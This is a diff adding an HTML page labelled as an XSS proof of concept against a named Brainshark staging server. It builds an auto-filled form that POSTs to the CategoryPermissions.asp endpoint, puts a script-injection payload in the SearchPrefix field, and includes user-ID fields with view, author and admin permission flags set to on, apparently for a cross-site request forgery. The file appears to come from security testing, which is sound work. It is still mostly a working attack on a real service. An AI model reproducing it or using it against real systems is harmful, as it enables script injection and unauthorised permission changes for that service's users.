@@ -1,0 +1,91 @@
+<html>
+<!-- XSS PoC -->
+<body>
+<script>
+//history.pushState('', '', '/')
+
+function submitForm(){
+
+	var  txtServer = document.getElementById('server');
+	var txtFolderId = document.getElementById('folderId');
+	var action=  'https://' + txtServer.value + '/brainshark/CorpAdmin/CategoryPermissions.asp?submitForm=2&fromPage=&folderId=' + txtFolderId.value;
+
+	var form = document.getElementById('form1');
+	//form.action=action;
+	form.submit();
+
+}
+
+</script>
+
+<label for="Server">Server</label>
+<input id="server" type="text" value="appstaging.brainshark.com" /><br/>
+
+<label for="BaseAddress">FolderId</label>
+<input id="folderId" type="text" value="8882617" /><br/>
+
+
+<form id="form1" action="https://staging.brainshark.com/brainshark/CorpAdmin/CategoryPermissions.asp?submitForm=1&fromPage=&folderId=8549160" method="POST">
+<label for="SearchType">SearchType</label>
+<input type="text" name="SearchType" value="username" /><br/>
+<label for="SearchPrefix">SearchPrefix</label>
+<input type="text" name="SearchPrefix" value="qedmv</script><script>alert(1)</script>ph461" /><br/>
+<label for="SearchCounter">SearchCounter</label>
+<input type="text" name="SearchCounter" value="0" /><br/>
+<label for="UidFld0">UidFld0</label>
+<input type="text" name="UidFld0" value="7525969" /><br/>
+<label for="GidFld0">GidFld0</label>
+<input type="text" name="GidFld0" value="0" /><br/>
+<label for="GroupType0">GroupType0</label>
+<input type="text" name="GroupType0" value="" /><br/>
+<label for="UidFld1">UidFld1</label>
+<input type="text" name="UidFld1" value="7525970" /><br/>
+<label for="GidFld1">GidFld1</label>
+<input type="text" name="GidFld1" value="0" /><br/>
+<label for="GroupType1">GroupType1</label>
+<input type="text" name="GroupType1" value="" /><br/>
+<label for="UidFld2">UidFld2</label>
+<input type="text" name="UidFld2" value="7525967" /><br/>
+<label for="GidFld2">GidFld2</label>
+<input type="text" name="GidFld2" value="0" /><br/>
+<label for="GroupType2">GroupType2</label>
+<input type="text" name="GroupType2" value="" /><br/>
+<label for="ViewFld2">ViewFld2</label>
+<input type="text" name="ViewFld2" value="on" /><br/>
+<label for="AthrFld2">AthrFld2</label>
+<input type="text" name="AthrFld2" value="on" /><br/>
+<label for="AdmnFld2">AdmnFld2</label>
+<input type="text" name="AdmnFld2" value="on" /><br/>
+<label for="UidFld3">UidFld3</label>
+<input type="text" name="UidFld3" value="7525968" /><br/>
+<label for="GidFld3">GidFld3</label>
+<input type="text" name="GidFld3" value="0" /><br/>
+<label for="GroupType3">GroupType3</label>
+<input type="text" name="GroupType3" value="" /><br/>
+<label for="ViewFld3">ViewFld3</label>
+<input type="text" name="ViewFld3" value="on" /><br/>
+<label for="AthrFld3">AthrFld3</label>
+<input type="text" name="AthrFld3" value="on" /><br/>
+<label for="UidFld4">UidFld4</label>
+<input type="text" name="UidFld4" value="6465053" /><br/>
+<label for="GidFld4">GidFld4</label>
+<input type="text" name="GidFld4" value="0" /><br/>
+<label for="GroupType4">GroupType4</label>
+<input type="text" name="GroupType4" value="" /><br/>
+<label for="ViewFld4">ViewFld4</label>
+<input type="text" name="ViewFld4" value="on" /><br/>
+<label for="AthrFld4">AthrFld4</label>
+<input type="text" name="AthrFld4" value="on" /><br/>
+<label for="AdmnFld4">AdmnFld4</label>
+<input type="text" name="AdmnFld4" value="on" /><br/>
+<label for="FieldCount">FieldCount</label>
+<input type="text" name="FieldCount" value="5" /><br/>
+<label for="NameFirst">NameFirst</label>
+<input type="text" name="NameFirst" value="1" /><br/>
+<label for="NameLast">NameLast</label>
+<input type="text" name="NameLast" value="5" />
+
+</form>
+<button onclick="submitForm()" >Submit</button>
+</body>
+</html>
